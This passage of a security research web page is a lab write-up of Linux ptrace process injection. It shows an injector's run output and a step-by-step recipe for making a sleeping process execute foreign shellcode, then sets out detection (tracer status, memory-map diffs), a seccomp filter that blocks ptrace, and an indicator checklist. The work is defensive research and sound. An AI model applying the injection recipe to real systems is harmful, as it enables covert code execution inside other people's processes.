+            <video controls playsinline preload="metadata" poster="../../assets/vid/borrow-red.jpg" aria-label="Screen recording: BORROW RED, operator@lab">
+              <source src="../../assets/vid/borrow-red.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> Build the injector, run it, and watch a sleeping process execute our code under its own pid. The 8 bytes in /tmp/gh003_pwned decode to the victim's pid. Every command below is copy-pasteable.</figcaption>
+          </figure>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Run it, read the proof</h3>
+              <div class="prose"><p>One command. The proof is the last three lines: the file says the code ran as pid 17503, and 17503 is the victim.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="./inject&#10;od -A d -t u8 /tmp/gh003_pwned"><span data-label>COPY</span></button></div>
+                <pre>$ ./inject
+[*] victim: sleep, pid 17503 (our child)
+[*] attached. victim frozen mid-sleep.
+[*] syscall gadget at 0x757e17df38b5 (borrowed from victim's own libc)
+[*] victim mmapped us a cave at 0x757e17fe8000
+[*] wrote 104 bytes of shellcode into the victim
+[*] shellcode hit int3. it ran INSIDE the victim.
+[*] /tmp/gh003_pwned says the code ran as pid 17503
+[*] victim's real pid is 17503 -&gt; MATCH. borrowed body confirmed.
+[*] registers restored, detached. victim resumes its nap.
+$ od -A d -t u8 /tmp/gh003_pwned
+0000000                17503
+0000008</pre>
+              </div>
+              <div class="prose"><p><strong>od</strong> reads the 8 raw bytes as one unsigned 64-bit integer: 17503. Those bytes were written by the <strong>write</strong> syscall executed inside sleep's address space, with sleep's pid in the register. There is no other way for that number to be in that file.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>The seven moves, precisely</h3>
+              <div class="prose"><p><strong>Move 1, spawn.</strong> fork, and the child execs /bin/sleep. The victim is our child, so Yama scope 1 permits the attach. Real malware does the same: it launches the process it intends to wear.</p></div>
+              <div class="prose"><p><strong>Move 2, freeze.</strong> PTRACE_ATTACH stops the victim mid-nanosleep. Its registers are now ours to read and write.</p></div>
+              <div class="prose"><p><strong>Move 3, borrow the gadget.</strong> Scan the victim's executable mappings for the bytes 0f 05, the syscall instruction, inside its own libc. We do not bring our own syscall instruction; we borrow the victim's, so the kernel sees the victim invoking the syscall.</p></div>
+              <div class="prose"><p><strong>Move 4, remote mmap.</strong> Load the registers as if the victim itself were calling mmap(NULL, 8192, RWX, PRIVATE|ANONYMOUS): rax=9, rdi=0, rsi=8192, rdx=7, r10=0x22, r8=-1, r9=0, rip=gadget. Single-step once. The victim allocates an 8KB executable cave, and the address comes back in rax. The victim built its own hiding place.</p></div>
+              <div class="prose"><p><strong>Move 5, copy.</strong> process_vm_writev writes the 104 shellcode bytes into the cave. Nothing executes yet.</p></div>
+              <div class="prose"><p><strong>Move 6, run.</strong> Set rip to the cave, clear the restart cookie (see the callout), and continue. The shellcode runs: open, getpid, write, close, int3. Five syscalls, all charged to the victim's pid.</p></div>
+              <div class="prose"><p><strong>Move 7, vanish.</strong> The int3 raises SIGTRAP, which stops the victim and hands control back. Verify the file, restore the saved registers, detach. The victim resumes its nanosleep. Its code, its stack, and its memory are untouched; for one millisecond it was someone else.</p></div>
+              <div class="callout"><p><strong>The trap we fell into.</strong> The first version of this injector crashed every run: SIGSEGV at an impossible address, two bytes <em>before</em> the cave. The cause took an hour. Attaching had frozen the victim inside nanosleep, so rax held -ERESTART_RESTARTBLOCK, a kernel cookie meaning "restart this syscall when resumed." Resuming with that cookie intact made the kernel take the syscall-restart path instead of running our code. The fix is one line: set rax to -1 before resuming. gdb handles this silently every time you attach to a sleeping process; doing it by hand is what "frozen mid-syscall" actually means.</p></div>
+              <div class="verdict red">
+                <span class="mlabel">Stealth confirmed</span>
+                <p>One unprivileged process made another process execute its code, under the victim's pid and with the victim's authority. No exploit, no privilege escalation, no kernel module: just the debugger API, used as designed, by the wrong party. The process list never changed. Nothing was hidden, because nothing needed to be.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="phase-blue">
+          <div class="phase-head"><span class="phase-num">04</span><h2>Phase Blue: two independent observations</h2><span class="phase-tag blue">DEFENSE</span></div>
+          <p class="lede">The injector's stdout proves the attack worked; it detects nothing. Detection is observations the attacker does not control. Here are two, plus the exact boundary of the default protection.</p>
+          <div class="prose">
+            <p>Here is the trap most defenders walk into: <strong>ps</strong> shows the victim, <strong>top</strong> shows it sleeping, the logs show nothing. Every one of those is true and every one misses the point. The process was never hidden and never modified; it was <em>borrowed</em> for a millisecond. You cannot detect this by looking at the process list. You detect it by looking at the relationships the kernel maintains about the process.</p>
+          </div>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot blue" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">38.2s</span>
+            </div>
+            <video controls playsinline preload="metadata" poster="../../assets/vid/borrow-blue.jpg" aria-label="Screen recording: BORROW BLUE, operator@lab">
+              <source src="../../assets/vid/borrow-blue.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> The injector pauses mid-intrusion. /proc exposes the tracer relationship, and the memory-map diff shows the one new anonymous executable region. Every command below is copy-pasteable.</figcaption>
+          </figure>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Observation one: the tracer relationship</h3>
+              <div class="prose"><p>The kernel always knows who is controlling whom. While the injector holds the victim, /proc says so plainly.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="./inject --pause &gt; red.log 2&gt;&amp;1 &amp;&#10;sleep 2&#10;VP=$(sed -n 's/.*victim: sleep, pid \([0-9]*\).*/\1/p' red.log)&#10;grep -E '^(TracerPid|State):' /proc/$VP/status"><span data-label>COPY</span></button></div>
+                <pre>$ ./inject --pause &gt; red.log 2&gt;&amp;1 &amp;
+$ sleep 2
+$ VP=$(sed -n 's/.*victim: sleep, pid \([0-9]*\).*/\1/p' red.log)
+$ grep -E '^(TracerPid|State):' /proc/$VP/status
+TracerPid:      16846
+State:  t (tracing stop)</pre>
+              </div>
+              <div class="prose"><p><strong>State t</strong> means tracing stop; <strong>TracerPid</strong> names the controller. A daemon sitting in state <strong>t</strong> with a TracerPid you do not recognize is the intrusion, stated in two lines. After the detach, TracerPid returns to 0, which is exactly why one observation is not enough: the relationship is only visible while the borrowing is in progress.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Observation two: the memory-map diff</h3>
+              <div class="prose"><p>The cave survives the detach. It is anonymous, executable, and it was not there before. The injector snapshots the maps on both sides of the intrusion; the diff is the detection.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="diff /tmp/gh003_maps_before /tmp/gh003_maps_after"><span data-label>COPY</span></button></div>
+                <pre>$ diff /tmp/gh003_maps_before /tmp/gh003_maps_after
+13a14
+&gt; 7f8b3c1e9000-7f8b3c1eb000 rwxp 00000000 00:00 0</pre>
+              </div>
+              <div class="prose"><p>One added line: an 8KB <strong>rwxp</strong> region with no file behind it (the 00:00 device). Legitimate processes almost never gain anonymous executable mappings mid-life; JIT compilers are the exception, and sleep is not a JIT. Baseline the maps of the processes that matter, diff on a timer, and this line is your alert. D3FEND names the general form <a href="https://d3fend.mitre.org/technique/d3f:SystemCallAnalysis/" rel="noopener">System Call Analysis (D3-SCA)</a>: the ptrace, mmap, and process_vm_writev sequence from a single parent is the behavioral signature behind the artifact.</p></div>
+            </div>
+          </div>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot blue" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">20.2s</span>
+            </div>
+            <video controls playsinline preload="metadata" poster="../../assets/vid/borrow-yama.jpg" aria-label="Screen recording: BORROW YAMA, operator@lab">
+              <source src="../../assets/vid/borrow-yama.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> Ubuntu's default Yama scope stops a stranger's attach cold, and the reason the whole red phase worked anyway. Every command below is copy-pasteable.</figcaption>
+          </figure>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div>
+              <h3>The Yama boundary, and its hole</h3>
+              <div class="prose"><p>Ubuntu ships Yama scope 1: a process may trace only its descendants. Here is the boundary, verified live.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="cat /proc/sys/kernel/yama/ptrace_scope&#10;runuser -u nobody -- python3 -c &quot;import ctypes; l=ctypes.CDLL('libc.so.6',use_errno=True); r=l.ptrace(16,1,0,0); print('non-child attach as nobody -&gt;',r,'errno',ctypes.get_errno())&quot;"><span data-label>COPY</span></button></div>
+                <pre>$ cat /proc/sys/kernel/yama/ptrace_scope
+1
+$ runuser -u nobody -- python3 -c "import ctypes; l=ctypes.CDLL('libc.so.6',use_errno=True); r=l.ptrace(16,1,0,0); print('non-child attach as nobody -&gt;',r,'errno',ctypes.get_errno())"
+non-child attach as nobody -&gt; -1 errno 1</pre>
+              </div>
+              <div class="prose"><p>Errno 1 is EPERM: a stranger cannot attach. But the entire red phase ran under this same scope, because the injector is the victim's <em>parent</em>, and parents are always allowed. The control shapes the attack without stopping it: the adversary simply becomes the parent first, spawning the process it intends to wear. A defense that the attacker routes around by changing one line is a speed bump with a threat model attached.</p></div>
+              <div class="verdict green">
+                <span class="mlabel">Detection verified</span>
+                <p>Two observations neither share the attacker's control: the kernel's tracer relationship (State t, TracerPid) and the one-line memory-map diff. Yama scope 1 was measured too, boundary and hole both. None of these ask the process list anything.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="countermeasures">
+          <div class="phase-head"><span class="phase-num">05</span><h2>Countermeasures</h2><span class="phase-tag blue">DEFENSE</span></div>
+          <p class="lede">Three moves, in order: confirm nothing persists, watch the map, deny the syscall. Each is one way, not the way.</p>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Mitigate: confirm it is memory-only</h3>
+              <div class="prose"><p>Kill the victim and the cave dies with the address space. This injection has no file, no persistence, and no reboot survival: it is a purely in-memory borrowing. That cuts two ways. Recovery is trivial, kill the process. But there is also nothing to find afterward except the maps diff, which is why observation two exists. (The /tmp/gh003_pwned file is our proof artifact, not the attacker's tradecraft; a real payload exfiltrates or stays resident, it does not leave labeled evidence.)</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Monitor: watch the map</h3>
+              <div class="prose"><p>Baseline /proc/&lt;pid&gt;/maps for the long-lived processes that matter, diff on a timer, alert on new anonymous rwxp regions. The one-liner below is the whole monitor; production versions add baselines and alerting, not new ideas.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="for p in $(pgrep -x cron); do diff &quot;/var/lib/ghostlight/maps.$p.base&quot; &quot;/proc/$p/maps&quot;; done"><span data-label>COPY</span></button></div>
+                <pre>$ for p in $(pgrep -x cron); do diff "/var/lib/ghostlight/maps.$p.base" "/proc/$p/maps"; done</pre>
+              </div>
+              <div class="prose"><p>Pair it with the tracer check: any long-lived process in State <strong>t</strong> whose TracerPid is not your debugger is worth a page. D3FEND's <a href="https://d3fend.mitre.org/technique/d3f:SystemCallAnalysis/" rel="noopener">System Call Analysis (D3-SCA)</a> is the behavioral form of the same idea: the ptrace, remote-mmap, process_vm_writev sequence from a single parent is the signature, whether or not you catch the maps diff.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div>
+              <h3>Prevent: deny the syscall</h3>
+              <div class="prose"><p>The principled lock is seccomp-bpf: forbid the process tree from calling ptrace at all. <strong>nospy.c</strong> installs a six-instruction BPF filter (any ptrace syscall returns EPERM) and execs its target under it. This is what Chrome's sandbox and systemd's SystemCallFilter=~ptrace do in production.</p></div>
+<div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">c: nospy.c</span><button class="copy-btn" data-copy="/* nospy.c - GH-003 lab tool: run a program with ptrace() denied by seccomp-bpf.&#10; * Installs a tiny BPF filter (any ptrace() -&gt; EPERM), then execs the target.&#10; * Models what hardened launchers do: Chrome&#x27;s sandbox and systemd&#x27;s&#10; * SystemCallFilter=~ptrace both deny this syscall outright.&#10; * Usage: ./nospy ./inject   (the injector&#x27;s PTRACE_ATTACH then fails) */&#10;#include &lt;stdio.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;errno.h&gt;&#10;#include &lt;stddef.h&gt;&#10;#include &lt;sys/prctl.h&gt;&#10;#include &lt;sys/syscall.h&gt;&#10;#include &lt;linux/filter.h&gt;&#10;#include &lt;linux/seccomp.h&gt;&#10;#include &lt;linux/audit.h&gt;&#10;&#10;int main(int argc, char **argv) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;prog&gt; [args...]\n&quot;, argv[0]); return 1; }&#10;    struct sock_filter f[] = {&#10;        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),&#10;        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),&#10;        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),&#10;        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),&#10;        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),&#10;        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM &amp; 0xffff)),&#10;        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),&#10;    };&#10;    struct sock_fprog p = { (unsigned short)(sizeof f / sizeof f[0]), f };&#10;    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) &lt; 0) { perror(&quot;no_new_privs&quot;); return 1; }&#10;    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;p) &lt; 0) { perror(&quot;seccomp&quot;); return 1; }&#10;    printf(&quot;[nospy] seccomp filter live: ptrace() is now denied for this tree.\n&quot;);&#10;    fflush(stdout);&#10;    execvp(argv[1], &amp;argv[1]);&#10;    perror(&quot;execvp&quot;);&#10;    return 1;&#10;}&#10;"><span data-label>COPY</span></button></div>
+                <pre>/* nospy.c - GH-003 lab tool: run a program with ptrace() denied by seccomp-bpf.
+ * Installs a tiny BPF filter (any ptrace() -&gt; EPERM), then execs the target.
+ * Models what hardened launchers do: Chrome&#x27;s sandbox and systemd&#x27;s
+ * SystemCallFilter=~ptrace both deny this syscall outright.
+ * Usage: ./nospy ./inject   (the injector&#x27;s PTRACE_ATTACH then fails) */
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/audit.h&gt;
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;prog&gt; [args...]\n&quot;, argv[0]); return 1; }
+    struct sock_filter f[] = {
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM &amp; 0xffff)),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+    };
+    struct sock_fprog p = { (unsigned short)(sizeof f / sizeof f[0]), f };
+    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) &lt; 0) { perror(&quot;no_new_privs&quot;); return 1; }
+    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;p) &lt; 0) { perror(&quot;seccomp&quot;); return 1; }
+    printf(&quot;[nospy] seccomp filter live: ptrace() is now denied for this tree.\n&quot;);
+    fflush(stdout);
+    execvp(argv[1], &amp;argv[1]);
+    perror(&quot;execvp&quot;);
+    return 1;
+}
+</pre>
+              </div>
+              <figure class="recording reveal">
+                <div class="recording-bar">
+                  <span class="rec-dot blue" aria-hidden="true"></span>
+                  <span class="mlabel">Real screen recording</span>
+                  <span class="dur">17.6s</span>
+                </div>
+                <video controls playsinline preload="metadata" poster="../../assets/vid/borrow-close.jpg" aria-label="Screen recording: BORROW CLOSE, operator@lab">
+                  <source src="../../assets/vid/borrow-close.mp4" type="video/mp4">
+                </video>
+                <figcaption class="recording-cap"><strong>What you are watching:</strong> The injector runs under the seccomp filter. Its first ptrace dies with EPERM, and the victim is cleaned up, not orphaned. Every command below is copy-pasteable.</figcaption>
+              </figure>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash, commands in this recording</span><button class="copy-btn" data-copy="gcc -O2 -o nospy nospy.c&#10;./nospy ./inject; echo &quot;exit=$?&quot;"><span data-label>COPY</span></button></div>
+                <pre>$ gcc -O2 -o nospy nospy.c
+$ ./nospy ./inject; echo "exit=$?"
+[nospy] seccomp filter live: ptrace() is now denied for this tree.
+PTRACE_ATTACH: Operation not permitted
+exit=1</pre>
+              </div>
+              <div class="prose"><p>D3FEND names this <a href="https://d3fend.mitre.org/technique/d3f:SystemCallFiltering/" rel="noopener">System Call Filtering (D3-SCF)</a>: controlling access to system resources at the kernel level. The filter is inherited across exec, so everything the injector launches is bound too.</p></div>
+              <div class="callout"><p><strong>Honest limit.</strong> The filter must be installed by whoever launches the process tree; it binds the injector's own tree, not the system. An attacker who launches their own injector outside any filter is unaffected, which is why this is a launcher's control, not a system property. The system-wide knobs are Yama scopes 2 and 3, but they need sysctl write access (read-only in some VMs and containers, including the one this file was verified on), and scope 3 disables debugging for everyone, yourself included. ptrace cannot be removed from the system without breaking the toolchain. It can only be narrowed, which is what this step does.</p></div>
+              <div class="verdict green">
+                <span class="mlabel">Countermeasures verified</span>
+                <p>The injection is memory-only, so killing the victim ends it. The maps diff plus the tracer check catch it while it runs. The seccomp filter denies the ptrace syscall outright for a launched tree, verified live. None of these survive an attacker who operates outside the filtered tree; defense here is narrowing, not removal.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="debrief">
+          <div class="phase-head"><span class="phase-num">06</span><h2>Debrief</h2><span class="phase-tag neutral">TAKEAWAY</span></div>
+          <p class="takeaway">A process that can be ptraced can be worn like a suit. Watch the tracer relationship and the memory map, not just the process list.</p>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">IOC checklist: signs this technique was used</span></p></div>
+          <ul class="checklist">
+            <li><span>A process in State <strong>t</strong> (tracing stop) with a <strong>TracerPid</strong> you do not recognize</span></li>
+            <li><span>New anonymous <strong>rwxp</strong> mappings in a process that never JITs (diff /proc/&lt;pid&gt;/maps against baseline)</span></li>
+            <li><span><strong>ptrace</strong>, <strong>process_vm_writev</strong>, or unexpected remote-mmap sequences from a single parent</span></li>
+            <li><span>Short-lived children of long-lived daemons that attach and detach: the spawn-then-borrow pattern</span></li>
+            <li><span>Seccomp denials for the ptrace syscall from a tree that was supposed to be filtered</span></li>
+          </ul>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">Reproducibility checklist</span></p></div>
+          <ul class="checklist">
+            <li><span>Verified on <strong>Ubuntu 24.04.5 LTS</strong>, <strong>gcc 13</strong>, x86-64, on 2026-09-16</span></li>
+            <li><span>All four recordings are real executions on that platform, not simulations</span></li>
+            <li><span>The attack runs unprivileged: the victim is the attacker's child, and no Yama setting was changed</span></li>
+            <li><span>Cleanup: the injector kills its victim; rm -f /tmp/gh003_pwned /tmp/gh003_maps_before /tmp/gh003_maps_after</span></li>
+          </ul>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">Sources</span></p></div>
+          <div class="prose"><p><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener">MITRE ATT&amp;CK T1055: Process Injection</a> and <a href="https://attack.mitre.org/techniques/T1055/008/" rel="noopener">T1055.008: Ptrace System Calls</a><br>
+          <a href="https://man7.org/linux/man-pages/man2/ptrace.2.html" rel="noopener">ptrace(2)</a> (the debugger API)<br>
+          <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html" rel="noopener">seccomp(2)</a> (syscall filtering)<br>
+          <a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html" rel="noopener">process_vm_writev(2)</a> (cross-process memory copy)<br>
+          <a href="https://www.kernel.org/doc/html/latest/security/Yama.html" rel="noopener">Yama documentation</a> (ptrace scopes)<br>
+          <a href="https://d3fend.mitre.org/" rel="noopener">MITRE D3FEND</a>: <a href="https://d3fend.mitre.org/technique/d3f:SystemCallAnalysis/" rel="noopener">D3-SCA</a>, <a href="https://d3fend.mitre.org/technique/d3f:SystemCallFiltering/" rel="noopener">D3-SCF</a></p></div>
+        </section>
+
+        <a class="next-file" href="../../index.html">
+          <span class="mlabel">Next file</span>
+          <h3>GH-004: in preparation</h3>
+          <p>The next Stealth technique file is being verified now. Back to the war table.</p>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="wrap footer-grid">
+    <div>
+      <div class="footer-brand">
+        <svg viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="12.5" fill="none" stroke="#e0642a" stroke-width="2.6"/><rect x="14.6" y="5.5" width="2.8" height="21" fill="#e0642a"/></svg>
+        <span class="brand-name" style="font-size:17px">GHOSTLIGHT</span>
+      </div>
+      <p class="footer-note">An independent adversary-stealth research publication. Every command verified on the named OS before publishing. No trackers, no frameworks, no autoplay.</p>
+    </div>
+    <nav class="footer-links">
+      <a href="../../method.html">METHOD</a>
+      <a href="../../index.html">FILES</a>
+      <a href="https://attack.mitre.org/tactics/TA0005/" rel="noopener">MITRE TA0005</a>
+    </nav>
+    <div class="footer-elsewhere">
+      <span class="mlabel">Elsewhere</span><a href="https://dillingerstaffing.github.io/portfolio/" target="_blank" rel="noopener">Portfolio</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/proving-ground/" target="_blank" rel="noopener">Proving Ground</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/tapeout/" target="_blank" rel="noopener">Tapeout</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/old-iron/" target="_blank" rel="noopener">Old Iron</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/unstuck/" target="_blank" rel="noopener">Unstuck</a>
+    </div>
+  </div>
+</footer>
+
+<script src="../../assets/site.js?v=55a6124c"></script>
+</body>
+</html>
